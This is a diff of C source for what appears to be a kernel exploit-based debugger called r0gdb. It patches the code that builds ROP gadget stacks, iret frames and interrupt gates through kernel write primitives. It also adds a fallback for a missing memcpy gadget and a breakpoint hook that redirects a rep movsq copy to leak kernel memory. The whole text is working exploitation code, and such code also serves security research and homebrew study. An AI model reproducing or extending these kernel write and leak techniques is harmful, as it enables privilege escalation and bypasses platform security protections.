@@ -298,9 +298,19 @@ void r0gdb_setup(int do_swapgs)
     kwrite20(tframe, iret, 0x20, 0);
     kwrite20(tframe+16, 2, kframe, 0);
     //set up int179 frames
-    kwrite20(gadget_stack+0x408, 0, iret, 0);
-    kwrite20(gadget_stack+0x500, offsets.rep_movsb_pop_rbp_ret, 0x20, 0);
-    kwrite20(gadget_stack+0x510, 0x40002, gadget_stack+0x408, 0);
+#ifdef MEMRW_FALLBACK
+    if(!offsets.rep_movsb_pop_rbp_ret)
+    {
+        kwrite20(gadget_stack+0x500, iret, 0x20, 0);
+        kwrite20(gadget_stack+0x510, 0x40002, gadget_stack+0x418, 0);
+    }
+    else
+#endif
+    {
+        kwrite20(gadget_stack+0x408, 0, iret, 0);
+        kwrite20(gadget_stack+0x500, offsets.rep_movsb_pop_rbp_ret, 0x20, 0);
+        kwrite20(gadget_stack+0x510, 0x40002, gadget_stack+0x408, 0);
+    }
     //set up gates
     volatile char* addr = do_swapgs ? (void*)&swapgs_add_rsp_0xe8_iret : (void*)&add_rsp_0xe8_iret;
     char gate[16] = {0};
@@ -630,6 +640,39 @@ static void trace_on_break(uint64_t* regs)
         if(trace_prog_after_trace_on_break)
             trace_prog = trace_prog_after_trace_on_break;
     }
+}
+
+static uint64_t ptr_to_leaked_rep_movsq;
+static void leak_rep_movsq(uint64_t* regs)
+{
+    static int not_first;
+    static int leaking = 0;
+    static uint64_t old_rdi, old_rsi, old_rcx;
+    if(not_first)
+    {
+        if(leaking == 1)
+        {
+            regs[12] = old_rdi;
+            regs[11] = old_rsi;
+            regs[6] = old_rcx;
+            leaking = 2;
+        }
+        else if(!leaking && regs[12] == old_rdi + 8 && regs[11] == old_rsi + 8 && regs[6] == old_rcx - 1 && regs[6])
+        {
+            old_rdi = regs[12];
+            old_rsi = regs[11];
+            old_rcx = regs[6];
+            regs[12] = ptr_to_leaked_rep_movsq;
+            regs[11] = kframe;
+            regs[6] = 2;
+            leaking = 1;
+            return;
+        }
+    }
+    not_first = 1;
+    old_rdi = regs[12];
+    old_rsi = regs[11];
+    old_rcx = regs[6];
 }
 
 static uint64_t* jprog = 0;
